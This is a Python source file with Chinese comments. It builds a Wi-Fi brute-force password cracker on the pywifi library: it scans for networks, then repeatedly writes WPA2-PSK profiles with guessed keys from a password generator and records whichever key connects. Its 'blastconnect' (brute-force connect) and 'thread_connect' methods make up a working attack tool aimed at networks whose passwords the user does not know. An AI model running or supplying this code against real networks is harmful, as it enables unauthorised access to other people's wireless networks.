import pywifi
from pywifi import const
#导入pywifi模块  以及常量
import time
import threading
#导入线程模块


class WiFi(object):
    # 创建一个wifi的类
    def __init__(self):
        #创建一个wifi对象
        self.wifi = pywifi.PyWiFi()
        #获取当前网卡
        self.ifaces = self.wifi.interfaces()[0]
        self.listword = []

    def wifi_scan(self):
        # 扫描
        # 获取一个无线网卡
        # 扫描
        wifilist = []
        self.ifaces.scan()
        # 获取扫描结果  不一定出结果  可能需要多运行几次
        # 返回一个列表  包含wifi的对象
        result = self.ifaces.scan_results()
        # print(result)
        for name in result:
            # ssid WiFi的名称
            wifilist.append(name.ssid)
        #返回列表结果
        return wifilist


    def wifi_stutas(self):
        # 判断
        # 创建一个无线对象
        # 胡渠道第一个无线网卡 返回一个列表
        # 打印网卡的名称
        # print(ifaces.name())
        # 列表
        # print(ifaces)
        # 打印网卡连接状态  未连接 0   连接到 4
        #print(ifaces.status())
        # const.IFACE-CONNECTED  常量值  已连接   值为4
        if self.ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False

    def wifi_disconnect(self):
        #wifi 断开
        self.ifaces.disconnect()
        time.sleep(0.01)
        return True

    def blastconnect(self,name,password):
        # 爆破连接

        # 断开连接
        self.wifi_disconnect()


        # 判断目前的网卡连接状态
        wifistatus = self.wifi_stutas()

        if not wifistatus:

            # 创建WiFi连接文件 用于新wifi的连接
            profile = pywifi.Profile()
            # 要连接wifi的名称
            profile.ssid = name
            # 网卡的开放
            profile.auth = const.AUTH_ALG_OPEN
            # WiFi加密算法
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            # 加密单元
            profile.cipher = const.CIPHER_TYPE_CCMP
            while True:
                if self.listword == []:
                    # 密码
                    try:
                        profile.key = str(''.join(next(password)))
                    # 删除所有的WiFi文件
                    except:
                        break
                    self.ifaces.remove_all_network_profiles()
                    # 设定新的连接文件
                    tep_profie = self.ifaces.add_network_profile(profile)
                    self.ifaces.connect(tep_profie)
                    # wifi 连接时间
                    time.sleep(3)
                    # 判断状态
                    if self.ifaces.status() == const.IFACE_CONNECTED:
                        self.listword.append(profile.key)
                    else:
                        continue
                else:
                    break

    def thread_connect(self,threadnum,name,password):
        # 多线程爆破
        self.listword = []
        for i in range(int(threadnum)):
            t = threading.Thread(target=self.blastconnect,args=(name,password,))
            t.start()
            t.join()
        return self.listword


    def normalconnect(self,name,password):
        # 正常连接

        # 断开连接
        self.wifi_disconnect()


        # 判断目前的网卡连接状态
        wifistatus = self.wifi_stutas()

        if not wifistatus:
            # 创建WiFi连接文件 用于新wifi的连接
            profile = pywifi.Profile()
            # 要连接wifi的名称
            profile.ssid = name
            # 网卡的开放
            profile.auth = const.AUTH_ALG_OPEN
            # WiFi加密算法
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            # 加密单元
            profile.cipher = const.CIPHER_TYPE_CCMP

            # 密码
            profile.key = password
            # 删除所有的WiFi文件
            self.ifaces.remove_all_network_profiles()
            # 设定新的连接文件
            tep_profie = self.ifaces.add_network_profile(profile)
            self.ifaces.connect(tep_profie)
            # wifi 连接时间
            time.sleep(4)
            # 判断状态
            if self.ifaces.status() == const.IFACE_CONNECTED:
                return True
            else:
                return False



#test = WiFi()
#x=test.wifi_scan()
#print(x)





